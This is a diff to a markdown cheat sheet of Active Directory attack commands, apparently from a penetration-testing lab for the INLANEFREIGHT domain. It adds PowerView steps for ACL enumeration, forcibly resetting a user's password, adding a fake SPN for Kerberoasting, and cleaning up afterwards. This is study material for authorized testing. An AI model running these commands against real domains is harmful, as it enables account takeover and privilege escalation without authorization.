@@ -1915,15 +1915,16 @@ Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.t
 # A foreach loop used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(ad_users.txt) to the Get-ADUser cmdlet, then enumerates access rights of those users. Performed from a Windows-based host.
 foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
 
+# Investigating the Help Desk Level 1 Group with Get-DomainGroup
+Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
+
+# Investigating the Information Technology Group
+$itgroupsid = Convert-NameToSid "Information Technology" Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
 
 # PowerView tool used to change the password of a specifc user (damundsen) on a target Windows domain from a Windows-based host.
-Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
-
-# PowerView tool used to change the password of a specifc user (damundsen) on a target Windows domain from a Windows-based host.
-Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
-
-
-# PowerView tool used to change the password of a specifc user (damundsen) on a target Windows domain from a Windows-based host.
+$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+Import-Module .\PowerView.ps1
 Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
 
 # PowerView tool used to add a specifc user (damundsen) to a specific security group (Help Desk Level 1) in a target Windows domain from a Windows-based host.
@@ -1934,6 +1935,15 @@ Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
 
 # PowerView tool used create a fake Service Principal Name given a sepecift user (adunn) from a Windows-based host.
 Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+
+# PowerView tool used Removing the Fake SPN from adunn's Account
+Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
+
+# PowerView tool used Removing damundsen from the Help Desk Level 1 Group
+Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
+
+# PowerShell cmd-let used to covert an SDDL string into a readable format. Performed from a Windows-based host.
+ConvertFrom-SddlString "<Chuỗi SDDL>" | select -ExpandProperty DiscretionaryAcl
 ```
 
 ##### DCSync Attack
